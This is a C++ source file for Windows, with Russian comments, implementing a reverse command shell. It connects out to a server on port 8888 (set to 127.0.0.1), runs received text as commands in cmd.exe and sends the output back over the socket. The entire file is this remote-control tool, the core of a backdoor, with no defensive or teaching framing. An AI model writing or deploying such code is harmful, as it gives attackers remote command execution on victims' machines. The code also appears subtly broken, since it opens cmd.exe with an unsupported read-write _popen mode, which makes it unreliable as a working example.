#include <cstdio>
#include <iostream>
#include <string>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

class CommandShell {
public:
  CommandShell() {
    // Открываем процесс cmd.exe
    process = _popen("cmd.exe", "r+");
    if (!process) {
      throw std::runtime_error("Failed to open command shell.");
    }
  }

  ~CommandShell() { _pclose(process); }

  void sendCommand(const std::string &command) {
    // Отправляем команду в командную оболочку
    fprintf(process, "%s\r\n", command.c_str());
    fflush(process);
  }

  std::string readOutput() {
    std::string output;
    char buffer[128];
    while (fgets(buffer, sizeof(buffer), process) != nullptr) {
      output += buffer;
    }
    return output;
  }

private:
  FILE *process;
};

void sendOutputToServer(SOCKET sock, CommandShell &shell) {
  while (true) {
    std::string output = shell.readOutput();
    if (!output.empty()) {
      send(sock, output.c_str(), output.size(), 0);
    }
  }
}

int main() {
  WSADATA wsaData;
  SOCKET sock;
  struct sockaddr_in server;

  // Инициализация Winsock
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
    std::cerr << "Failed to initialize Winsock. Error Code: "
              << WSAGetLastError() << std::endl;
    return 1;
  }

  // Создание сокета
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == INVALID_SOCKET) {
    std::cerr << "Could not create socket. Error Code: " << WSAGetLastError()
              << std::endl;
    return 1;
  }

  // Настройка адреса сервера
  server.sin_family = AF_INET;
  server.sin_port = htons(8888); // Порт, на котором работает сервер

  // Использование inet_pton для преобразования IP-адреса
  if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) {
    std::cerr << "Invalid address or Address not supported." << std::endl;
    return 1;
  }

  // Подключение к серверу
  if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
    std::cerr << "Connection error." << std::endl;
    return 1;
  }

  std::cout << "Client connected to server. Shell is ready for commands...\n";

  CommandShell shell;

  // Запускаем поток для отправки вывода команды на сервер
  std::thread outputThread(sendOutputToServer, sock, std::ref(shell));

  char buffer[1024];
  while (true) {
    // Чтение команды из сокета
    int receive_size = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (receive_size <= 0) {
      break; // Ошибка или закрытие соединения
    }

    buffer[receive_size] = '\0'; // Завершение строки команды
    std::string command(buffer);

    if (command == "exit") {
      break; // Завершить работу, если получен "exit"
    }

    // Отправляем команду в командную оболочку
    shell.sendCommand(command);
  }

  outputThread.join(); // Дожидаемся завершения потока
  closesocket(sock);
  WSACleanup();
  return 0;
}
